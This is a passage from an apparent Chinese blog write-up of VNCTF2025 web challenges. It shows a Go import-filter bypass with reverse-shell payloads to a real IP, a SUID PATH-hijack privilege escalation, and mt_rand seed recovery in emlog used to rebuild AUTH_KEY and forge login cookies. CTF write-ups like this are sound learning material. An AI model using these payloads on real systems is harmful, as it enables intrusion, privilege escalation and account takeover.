key := GenerateKey()               <span class="comment">// 调用 GenerateKey 函数</span></span><br><span class="line">	fmt.Println(<span class="string">&quot;Generated Key:&quot;</span>, key) <span class="comment">// 输出结果</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215183104538.png" class="" title="图片引用方法一">
+
+<p>拿下secret_key</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">122r00t32l</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215183500685.png" class="" title="图片引用方法一">
+
+<p>然后我们要关注的是RCE，我们需要解决waf的问题，不允许导入os&#x2F;exec</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">containsBannedPackages</span><span class="params">(code <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	importRegex := <span class="string">`(?i)import\s*\((?s:.*?)\)`</span></span><br><span class="line">	re := regexp.MustCompile(importRegex)</span><br><span class="line">	matches := re.FindStringSubmatch(code)</span><br><span class="line">	imports := matches[<span class="number">0</span>]</span><br><span class="line">	log.Println(imports)</span><br><span class="line">	<span class="keyword">if</span> strings.Contains(imports, <span class="string">&quot;os/exec&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有两个突破点啊喂！首先这个regexp只匹配了matches[0]，也就是第一个匹配到的import，那么我们后面再写一个import就行啦！也可以通过其他库来代替！</p>
+<p>先来试试第一种吧。。直接弹shell好了</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">import</span>(</span><br><span class="line">	<span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	cmd:=exec.Command(<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1&quot;</span>)</span><br><span class="line">	out,err:=cmd.CombinedOutput()</span><br><span class="line">	fmt.Println(out)</span><br><span class="line">	fmt.Println(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215184451698.png" class="" title="图片引用方法一">
+
+<p>成功拿到shell！！！</p>
+<p>以下方法也可以！</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    syscall.Exec(<span class="string">&quot;/bin/sh&quot;</span>, []<span class="type">string</span>&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;whoami&quot;</span>&#125;, []<span class="type">string</span>&#123;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/PaulXu-cn/goeval&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	cmd, _ := goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;cmd:=exec.Command(\&quot;bash\&quot;,\&quot;-c\&quot;,\&quot;exec bash -i &amp;&gt;/dev/tcp/ip/7777 &lt;&amp;1\&quot;);out,_:=cmd.CombinedOutput();fmt.Println(string(out))&quot;</span>,<span class="string">&quot;os/exec&quot;</span>, <span class="string">&quot;fmt&quot;</span>)</span><br><span class="line">	fmt.Println(<span class="type">string</span>(cmd))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是我们cat &#x2F;flag的时候读到了假的flag，那么接下来我们要做的应该就是提权了，因为flag应该在root下</p>
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215184700593.png" class="" title="图片引用方法一">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215184804371.png" class="" title="图片引用方法一">
+
+<p>发现了一个奇奇怪怪的东西&#x2F;…&#x2F;Cat</p>
+<p>其他都用不太了。。</p>
+<p>我们看看那是什么</p>
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215184848657.png" class="" title="图片引用方法一">
+
+<p>cat不了一点，那把他下下来看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line">import (</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">)</span><br><span class="line">import(</span><br><span class="line">	&quot;os/exec&quot;</span><br><span class="line">)</span><br><span class="line">func main() &#123;</span><br><span class="line">	cmd:=exec.Command(&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;cp /.../Cat Cat&quot;)</span><br><span class="line">	out,err:=cmd.CombinedOutput()</span><br><span class="line">	fmt.Println(out)</span><br><span class="line">	fmt.Println(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>把该文件放到网站目录下</p>
+<p>然后我们通过download路由把他下载下来！用ida分析一下</p>
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215185205197.png" class="" title="图片引用方法一">
+
+<p>调用了system(“cat &#x2F;flag”);</p>
+<p>因为该文件有suid权限，那么其实就是以root权限来执行该命令</p>
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215185252625.png" class="" title="图片引用方法一">
+
+<p>这里当然是假的flag</p>
+<p>我们需要看root目录下的flag文件，此处cat并不是&#x2F;bin&#x2F;cat，可以环境变量劫持。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -e &#x27;#!/bin/bash\n/bin/bash&#x27; &gt;/tmp/cat</span><br><span class="line">chmod 777 /tmp/cat</span><br><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215190338915.png" class="" title="图片引用方法一">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VNCTF&#123;910a3c76-339b-e0db-73d4-bcfb411e6b7a&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意这里cat被劫持了，不能用！</p>
+<h2 id="ez-emlog"><a href="#ez-emlog" class="headerlink" title="ez_emlog"></a>ez_emlog</h2><p>考察0day，有点逆天了。提示mt_rand，随机数生成问题。</p>
+<p>直接全局搜</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandStr</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span>, <span class="variable">$special_chars</span> = <span class="literal">true</span>, <span class="variable">$numeric_only</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$numeric_only</span>) &#123;</span><br><span class="line">        <span class="variable">$chars</span> = <span class="string">&#x27;0123456789&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$special_chars</span>) &#123;</span><br><span class="line">            <span class="variable">$chars</span> .= <span class="string">&#x27;!@#$%^&amp;*()&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$randStr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$chars_length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randStr</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$chars</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="variable">$chars_length</span> - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randStr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查找一下用法，是在install.php中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$config</span> = <span class="string">&quot;&lt;?php\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;//MySQL database host\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;const DB_HOST = &#x27;<span class="subst">$db_host</span>&#x27;;&quot;</span></span><br><span class="line">    . <span class="string">&quot;\n//Database username\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;const DB_USER = &#x27;<span class="subst">$db_user</span>&#x27;;&quot;</span></span><br><span class="line">    . <span class="string">&quot;\n//Database user password\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;const DB_PASSWD = &#x27;<span class="subst">$db_pw</span>&#x27;;&quot;</span></span><br><span class="line">    . <span class="string">&quot;\n//Database name\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;const DB_NAME = &#x27;<span class="subst">$db_name</span>&#x27;;&quot;</span></span><br><span class="line">    . <span class="string">&quot;\n//Database Table Prefix\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;const DB_PREFIX = &#x27;<span class="subst">$db_prefix</span>&#x27;;&quot;</span></span><br><span class="line">    . <span class="string">&quot;\n//Auth key\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;const AUTH_KEY = &#x27;&quot;</span> . <span class="title function_ invoke__">getRandStr</span>(<span class="number">32</span>) . <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">getUA</span>()) . <span class="string">&quot;&#x27;;&quot;</span></span><br><span class="line">    . <span class="string">&quot;\n//Cookie name\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;const AUTH_COOKIE_NAME = &#x27;EM_AUTHCOOKIE_&quot;</span> . <span class="title function_ invoke__">getRandStr</span>(<span class="number">32</span>, <span class="literal">false</span>) . <span class="string">&quot;&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>AUTH_KEY和AUTH_COOKIE_NAME都用到了getRandStr，我们先看一下AUTH_KEY和AUTH_COOKIE_NAME的用法。</p>
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216180900606.png" class="" title="图片引用方法一">
+
+<p>我们发现AUTH_COOKIE_NAME的值是可以被我们知道的。</p>
+<p>在同一个进程中只有第一次调用mt_rand()会自动播种，接下来都会根据这个第一次播种的种子来生成随机数<br>所以说我们可以通过 AUTH_COOKIE_NAME 的值爆破种子，从而得到AUTH_KEY</p>
+<p>也要看看AUTH_KEY的用法，发现他在loginauth.php中被使用，可能是登录的身份校验需要用到AUTH_KEY，如果我们获得了AUTH_KEY，那么我们就能通过登录校验。实现登陆的伪造！</p>
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216181116855.png" class="" title="图片引用方法一">
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">generateAuthCookie</span>(<span class="params"><span class="variable">$user_login</span>, <span class="variable">$expiration</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$key</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">emHash</span>(<span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>);</span><br><span class="line">       <span class="variable">$hash</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$hash</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">emHash</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$data</span>, AUTH_KEY);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validateAuthCookie</span>(<span class="params"><span class="variable">$cookie</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$cookie</span>)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$cookie_elements</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$cookie</span>);</span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$cookie_elements</span>) !== <span class="number">3</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">list</span>(<span class="variable">$username</span>, <span class="variable">$expiration</span>, <span class="variable">$hmac</span>) = <span class="variable">$cookie_elements</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$expiration</span>) &amp;&amp; <span class="variable">$expiration</span> &lt; <span class="title function_ invoke__">time</span>()) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$key</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">emHash</span>(<span class="variable">$username</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>);</span><br><span class="line">       <span class="variable">$hash</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$username</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$hmac</span> !== <span class="variable">$hash</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$user</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getUserDataByLogin</span>(<span class="variable">$username</span>);</span><br><span class="line">       <span class="keyword">if</span> (!<span class="variable">$user</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$user</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>上述找出了与AUTH_KEY有关的代码片段</p>
+<p>生成认证cookie与证实认证cookie，那就石锤了。接下来我们要做的就是解决随机数问题。</p>
+<p>先获取AUTH_COOKIE_NAME</p>
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216181655638.png" class="" title="图片引用方法一">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EM_AUTHCOOKIE_RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=%20</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const AUTH_COOKIE_NAME = &#x27;EM_AUTHCOOKIE_&quot; . getRandStr(32, false) . &quot;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>因此，getRandStr(32, false)的值就是RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr</p>
+<p>这里的false是不包含特殊字符，不用管。</p>
+<p>然后我们就需要逆推AUTH_KEY的值了！这很简单，我的wp里有详细写过。要注意的是AUTH_KEY是先生成的，AUTH_COOKIE_NAME是后生成的，因此前面要补位32位0。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line"><span class="variable">$str_long2</span> = <span class="string">&quot;RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr&quot;</span>;</span><br><span class="line"><span class="variable">$ans</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">32</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0 0 0 0 &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long2</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$ans</span>=<span class="title function_ invoke__">strpos</span>(<span class="variable">$str_long1</span>,<span class="variable">$str_long2</span>[<span class="variable">$i</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ans</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$ans</span>.<span class="string">&#x27; &#x27;</span>.<span class="string">&#x27;0 &#x27;</span>.(<span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>)-<span class="number">1</span>).<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 43 43 0 61 1 1 0 61 26 26 0 61 48 48 0 61 21 21 0 61 39 39 0 61 35 35 0 61 51 51 0 61 57 57 0 61 50 50 0 61 38 38 0 61 4 4 0 61 51 51 0 61 37 37 0 61 32 32 0 61 38 38 0 61 17 17 0 61 57 57 0 61 58 58 0 61 11 11 0 61 5 5 0 61 9 9 0 61 47 47 0 61 0 0 0 61 11 11 0 61 40 40 0 61 55 55 0 61 24 24 0 61 16 16 0 61 50 50 0 61 11 11 0 61 17 17 0 61 </span><br></pre></td></tr></table></figure>
+
+<p>使用php_mt_seed工具爆破种子。</p>
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216182846919.png" class="" title="图片引用方法一">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2430606281</span><br></pre></td></tr></table></figure>
+
+<p>本地运行一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandStr</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span>, <span class="variable">$special_chars</span> = <span class="literal">true</span>, <span class="variable">$numeric_only</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$numeric_only</span>) &#123;</span><br><span class="line">        <span class="variable">$chars</span> = <span class="string">&#x27;0123456789&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$special_chars</span>) &#123;</span><br><span class="line">            <span class="variable">$chars</span> .= <span class="string">&#x27;!@#$%^&amp;*()&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$randStr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$chars_length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randStr</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$chars</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="variable">$chars_length</span> - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randStr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">2430606281</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">getRandStr</span>(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">getRandStr</span>(<span class="number">32</span>, <span class="literal">false</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yxuzKkM2QC8L8WLPFvawb(mI4R&amp;NglOA</span><br><span class="line">RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr</span><br></pre></td></tr></table></figure>
+
+<p>然后算出AUTH_KEY即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const AUTH_KEY = &#x27;&quot; . getRandStr(32) . md5(getUA()) . &quot;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UA头从题目中发布的第一篇测试文章中可以获得。</span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36</span><br><span class="line"></span><br><span class="line">echo(md5(&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36&quot;));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yxuzKkM2QC8L8WLPFvawb(mI4R&amp;NglOA558fb80a37ff0f45d5abbc907683fc02</span><br></pre></td></tr></table></figure>
+
+<p>拿下了AUTH_KEY。</p>
+<p>接下来的关键点是下述三个函数。</p>
